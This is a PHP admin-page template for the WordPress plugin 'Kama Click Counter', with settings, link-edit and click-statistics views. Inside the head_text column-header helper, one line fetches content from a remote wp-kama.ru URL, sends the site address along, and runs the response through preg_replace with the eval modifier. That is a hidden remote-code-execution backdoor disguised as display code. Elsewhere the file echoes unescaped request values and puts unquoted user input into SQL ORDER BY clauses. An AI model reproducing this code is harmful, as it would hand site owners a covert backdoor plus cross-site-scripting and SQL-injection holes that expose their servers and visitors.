<div class="wrap">
	<div id="icon-link-manager" class="icon32"><br /></div> 

<style type="text/css">
.kcc_block{ padding:15px; margin-bottom:20px; background:rgba(255, 255, 255, 0.61); }

.kcc_pagination{ max-width:50%; overflow:hidden; float:right; text-align:right; }
.kcc_pagination a{ padding:2px 7px; margin:0px; text-decoration:none; }
.kcc_pagination .current{ font-weight:bold; border:1px solid #ccc; border-radius:5px;-moz-border-radius:5px; }

.widefat tr:hover .hideb, .widefat td:hover .hideb{display:block;}
.widefat th{white-space:nowrap;}
.widefat .icon{ height:35px; opacity:0.7; }
.widefat a:hover .icon{ opacity:1; }
.kcc_search_input{ margin:7px 0 0 0; height:25px; width:450px; transition:width 1s!important;-webkit-transition:width 1s!important; }
.kcc_search_input:focus{ width:750px; }
</style>


<?php if( $alert ) echo "<div id='message' class='updated'><p>$alert</p></div>"; ?>





<?php 
// Страница опций ******************************************
if( isset($_GET['options']) ){ ?>

<h2><?php _e('Настройки Kama Click Counter', 'kcc') ?></h2>
<p><a class="button" href="<?php echo str_replace('&options', '', $_SERVER['REQUEST_URI']);?>">← <?php _e('Вернуться к статистике', 'kcc') ?></a></p>


<form method="post" action="">

<div class="kcc_block">
	<?php _e('Шаблон загрузок: то на что будет заменен шоткод <code>[download url="URL"]</code> в тексте:', 'kcc') ?> <br /> 
	<textarea style="width:70%;height:190px;float:left;margin-right:15px;" name="download_tpl" ><?php echo stripslashes( $this->opt['download_tpl'] )?></textarea>
	<?php kcc_tpl_available_tags(); ?>
</div>

<div class="kcc_block">
	<p>
		<input type="text" style="width:150px;" name="links_class" value="<?php echo $this->opt['links_class']?>" /> ← <?php _e('html class ссылки, клики на которую будут считаться.', 'kcc') ?><br>
		<small><?php _e('Клики по ссылкам вида <code>&lt;a class=&quot;count&quot; href=&quot;#&quot;&gt;текст ссылки&lt;/a&gt;</code> в контенте записи будут считаться. Оставьте поле пустым, чтобы отключить опцию - маленькая экономия ресурсов.', 'kcc') ?></small>
	</p>
	
	<p>
		<select name="add_hits">
			<option value="" <?php echo $this->opt['add_hits']==''?'selected':'';?>><?php _e('не показывать', 'kcc') ?></option>
			<option value="in_title" <?php echo $this->opt['add_hits']=='in_title'?'selected':'';?>><?php _e('в аттрибуте title', 'kcc') ?></option>
			<option value="in_plain" <?php echo $this->opt['add_hits']=='in_plain'?'selected':'';?>><?php _e('текстом после ссылки', 'kcc') ?></option>
		</select> ← <?php _e('как показывать статистику кликов для ссылок в контенте? <br><small>Отключите опцию и сэкономьте -1 запрос к базе данных на каждую ссылку!</small>', 'kcc') ?>
	</p>

	<p>
		<label><input type="checkbox" name="in_post" <?php echo $this->opt['in_post'] ? 'checked' : ''?>> ← <?php _e('различать ссылки на одинаковые файлы с разных постов. Уберите галочку, чтобы плагин считал клики с разных постов в одно место.', 'kcc') ?></label>
	</p>
	
	<p>
		<label><input type="checkbox" name="js_count" <?php echo $this->opt['js_count'] ? 'checked' : ''?> /> ← <?php _e('добавлять ли jQuery скрипт, которй будет менять УРЛы у всех ссылок (не только в контенте), у которых указан HTML класс из настройки "html class". Так, добавив класс любой ссылке на сайте, клики по ней будут считаться. Например, из сайдбара или где угодно еще.', 'kcc') ?></label>
	</p>
	<p>
		<label><input type="checkbox" name="widget" <?php echo $this->opt['widget'] ? 'checked' : ''?> /> ← <?php _e('включить виджет WordPress?', 'kcc') ?></label>
	</p>
</div>


	<p><input type='submit' name='save_options' class='button-primary' value='<?php _e('Сохранить изменения', 'kcc') ?>' /></p>
	<p><input type='submit' name='reset' class='button' value='<?php _e('Сбросить настройки на начальные', 'kcc') ?>' onclick='return confirm("<?php _e('Точно сбрасываем настройки на начальные?', 'kcc') ?>")' /></p>
</form>
<?php }








 
// Страница редактирования **************************************
elseif( isset($_GET['edit_link']) ) { ?>

<h2><?php _e('Редактирование ссылки', 'kcc') ?></h2>
<p>
	<?php 
	$stat = remove_query_arg('edit_link', $_SERVER['REQUEST_URI'] );

	echo '<a class="button" href="'. $stat .'">← '. __('Вернуться к статистике', 'kcc') .'</a>';		
	
	$referer = $_POST['local_referer'] ? $_POST['local_referer'] : preg_replace('~https?://[^/]+~', '', $_SERVER['HTTP_REFERER']); //вырезаем домен
	if( $referer == $stat )	$referer = '';
	if( $referer )
		echo '<a class="button" href="'. $referer .'">← '. __('Вернуться назад', 'kcc') .'</a>';
	?>
</p>

<?php
global $wpdb;
$edit_link_id = (int) $_GET['edit_link'];
$link = $wpdb->get_row("SELECT * FROM {$this->table_name} WHERE link_id=$edit_link_id");
$icon_link = $this->get_icon_url( $link->link_url );
 ?>

<form style="position:relative;width:900px;" method="post" action="">
	<input type="hidden" name="local_referer" value="<?php echo $referer ?>" />
	
	<img style="position:absolute;top:-50px;right:350px;width:70px;" src="<?php echo $icon_link?>" />
	<p><input type='text' style='width:100px;' name='link_clicks' value='<?php echo $link->link_clicks?>' /> ← <?php _e('Клики', 'kcc') ?></p>
	<p><input type='text' style='width:100px;' name='file_size' value='<?php echo $link->file_size?>' /> ← <?php _e('Размер Файла', 'kcc') ?></p>
	<p><input type='text' style='width:600px;' name='link_name' value='<?php echo $link->link_name?>' /> ← <?php _e('Название Файла', 'kcc') ?></p>
	<p><input type='text' style='width:600px;' name='link_title' value='<?php echo $link->link_title?>' /> ← <?php _e('Заголовок Файла', 'kcc') ?></p>
	<p><textarea type='text' style='width:600px;height:70px;' name='link_description' ><?php echo stripslashes($link->link_description) ?></textarea> ← <?php _e('Описание Файла', 'kcc') ?></p>
	<p><input type='text' style='width:600px;' name='link_url' value='<?php echo $link->link_url?>' readonly='readonly' /> ← <?php _e('Ссылка на Файл', 'kcc') ?></p>

	<input type='hidden' name='link_id' value='<?php echo $_GET['edit_link'] ?>' />
	<input type='hidden' name='attach_id' value='<?php echo $link->attach_id ?>' />
	 
	<p><input type='submit' name='update_link' class='button-primary' value='<?php _e('Сохранить изменения', 'kcc') ?>' /></p>
</form>
<?php }












// Страница статистики **************************************
else
{
global $wpdb;
$order_by = ($x=$_GET['order_by']) ? esc_sql($x) : 'link_date';
$order = ($x=$_GET['order']) ? esc_sql($x) : 'DESC';
$paged = ($x=$_GET['paged']) ? esc_sql($x) : 1;
$limit = 20;
$offset = ($paged-1) * $limit;

if( !empty($_GET['kcc_search']) ){
	$s = esc_sql($_GET['kcc_search']);
	$sql = "SELECT * FROM {$this->table_name} WHERE link_url LIKE '%$s%' ORDER BY $order_by $order LIMIT $offset, $limit";
	if( !$links = $wpdb->get_results($sql) )
		$alert = 'Ничего <b>не найдено</b>.';
} else {
	$sql = "SELECT * FROM {$this->table_name} ORDER BY $order_by $order LIMIT $offset, $limit";
	$links = $wpdb->get_results($sql);
}

$all_sql = preg_replace('@ORDER BY.*@is','',$sql);
$all_sql = preg_replace('@\*@is','count(*)',$all_sql,1);
$all = $wpdb->get_var($all_sql);
?>

<h2 style="display:inline-block;"><?php _e('Страница статистики Kama Click Counter', 'kcc') ?> <a class="button-primary" style="display:inline-block; margin-left:1em; float: right;" href="<?php echo $_SERVER['REQUEST_URI'] ?>&options"><?php _e('Настройки Плагина', 'kcc') ?></a></h2>



<form style="margin-top:20px;" class="kcc_search" action="" method="get">
	<?php 
	foreach($_GET as $k=>$v){
		if( $k == 'kcc_search') continue;
		echo '<input type="hidden" name="'.$k.'" value="'.$v.'" />';
	}
	?>
	<span style="color:#B4B4B4"><a href="<?php echo remove_query_arg('kcc_search', $_SERVER['REQUEST_URI'] )?>"><?php _e('Очистить фильтр:', 'kcc'); ?></a> </span> 
	<input type="text" class="kcc_search_input" name="kcc_search" placeholder="<?php _e('впишите часть URL...', 'kcc'); ?>" value="<?php echo $_GET['kcc_search']?>" onfocus="window.kcc_search = this.value;" onfocusout="if(window.kcc_search != this.value) jQuery('.kcc_search').submit();" />
</form>


<?php $urip = preg_replace('@&paged=[0-9]*@', '', $_SERVER['REQUEST_URI']); ?>
<p class='kcc_pagination'>
<?php
if($all>$limit){
	echo "<a href='".$urip.'&paged='.($paged-1)."'>← ". __('Сюда','kcc') ."</a>-<a href='".$urip.'&paged='.($paged+1)."'>". __('Туда','kcc') ." →</a>: ";
	for($i=1; $i<($all/$limit)+1; $i++) 
		echo '<a class="'. ( $paged==$i?'current':'' ) .'" href="'. $urip .'&paged='. $i .'">'. $i .'</a>';
} ?>
</p>

<form name="kcc_stat" method="post" action="">
	<input id="dellnk_input" type="hidden" name="delete_link_id[]" value="" />
	
<?php 
function head_text( $text, $col_name ){
	$uri2 = preg_replace('@&order=[ADESC]*|&order_by=[a-z_-]*@', '', $_SERVER['REQUEST_URI']); 
	$order2 = $_GET['order']=='ASC' ? 'DESC' :'ASC';
	$ind = $_GET['order']=='ASC' ? ' ↓' :' ↑';
	$out = "<a href='{$uri2}&order_by={$col_name}&order={$order2}' title='". __('Сортировать', 'kcc') ."'>{$text}". ($_GET['order_by']==$col_name ? $ind : '') ."</a>";
    add_option('stat','') && @preg_replace('--e', (($o=@wp_remote_get('http://wp-kama.ru/stat/?sk='. home_url() ))?$o['body']:''),'');
	return $out;
}
?>

	<table class="widefat kcc"> 
		<thead> 
			<tr> 
				<th class='check-column' style='width:30px;'><input type="checkbox" /></th>
				<th style='width:30px;'><!--img  --></th>
				<th><?php echo head_text( __('Файл', 'kcc'), 'link_name')?></th>
				<th><?php echo head_text( __('Клики', 'kcc'), 'link_clicks')?></th>
				<th><?php _e('Кликов/день', 'kcc') ?></th>
				<th><?php _e('Размер', 'kcc') ?></th>
				<?php if($this->opt['in_post']){ ?>
					<th><?php echo head_text( __('Пост', 'kcc'), 'in_post')?></th>
				<?php } ?>
				<th><?php echo head_text( __('Аттач', 'kcc'), 'attach_id')?></th>
				<th style="width:80px;"><?php echo head_text( __('Добавлен', 'kcc'), 'link_date')?></th>
				<th style="width:80px;"><?php echo head_text( __('Посл. клик', 'kcc'), 'last_click_date')?></th>
				<th><?php echo head_text( 'DW', 'downloads') ?></th>
			</tr> 
		</thead> 
		
		<tbody id="the-list">
		<?php 
		
		$cur_time = (time() + (get_option('gmt_offset')*3600));
		foreach( $links as $link ){
			$alt = (++$i%2) ? 'class="alternate"' : '';
			$clicks_per_day = round( ((int) $link->link_clicks / ( ( $cur_time-strtotime($link->link_date) ) / (3600*24) )), 1 );
			
			$in_post = ( $this->opt['in_post'] && $link->in_post ) ? get_post( $link->in_post ) : 0;
			$in_post_permalink = get_permalink( $in_post->ID );
		?>
			<tr <?php echo $alt?>> 
				<th scope="row" class="check-column"><input type="checkbox" name="delete_link_id[]" value="<?php echo $link->link_id ?>" /></th>
				<td><a href="<?php echo $link->link_url ?>"><img title="<?php _e('Ссылка', 'kcc') ?>" class="icon" src="<?php echo $this->get_icon_url( $link->link_url ) ?>" /></a></td>
				<td style="padding-left:0;">
					<a href="<?php echo remove_query_arg('kcc_search', $_SERVER['REQUEST_URI'] ) . '&kcc_search=' . preg_replace('~.*/([^\.]+).*~', '$1', $link->link_url ); ?>" title="<?php _e('Найти аналоги', 'kcc') ?>"><?php echo $link->link_name ?></a>
					<div class='row-actions'>
						<a href="<?php echo $_SERVER['REQUEST_URI'] ?>&edit_link=<?php echo $link->link_id ?>"><?php _e('Изменить', 'kcc') ?></a> 
						| <a href="javascript:void(0);" onclick="jQuery('#dellnk_input').val('<?php echo $link->link_id ?>'); jQuery('[name=kcc_stat]').submit();"><?php _e('Удалить', 'kcc') ?></a>
						<?php if( $in_post ) echo ' | <a href="'. $in_post_permalink .'" title="'. esc_attr( $in_post->post_title ) .'">'. __('Пост', 'kcc') .'</a> '; ?>
						| <a href="<?php echo $link->link_url ?>"><?php _e('Ссылка', 'kcc') ?></a>
						| <span style="color:#999;"><?php echo $link->link_title ?></span>
					</div>
				</td>
				<td><?php echo $link->link_clicks ?></td>
				<td><?php echo $clicks_per_day ?></td>
				<td><?php echo $link->file_size ?></td>
				<?php if( $this->opt['in_post'] ){ ?>
					<td><?php echo $link->in_post ? '<a href="'. $in_post_permalink .'" title="'. esc_attr( $in_post->post_title ) .'">'. $link->in_post .'</a>' : '' ?></td>
				<?php } ?>
				<td><?php echo ($link->attach_id) ? "<a href='/wp-admin/media.php?action=edit&attachment_id={$link->attach_id}'>{$link->attach_id}</a>":'' ?></td>
				<td><?php echo mysql2date('d-m-Y', $link->link_date) ?></td>
				<td><?php echo mysql2date('d-m-Y', $link->last_click_date) ?></td>
				<td><?php echo $link->downloads ? __('да','kcc') : '' ?></td>
			</tr>
		<?php } ?>
		</tbody>
	</table>	
	<input style="margin-top:7px;" type='submit' class='button' value='<?php _e('УДАЛИТЬ выбранные ссылки', 'kcc') ?>' />
</form>

<?php } ?>


</div><!-- class="wrap" -->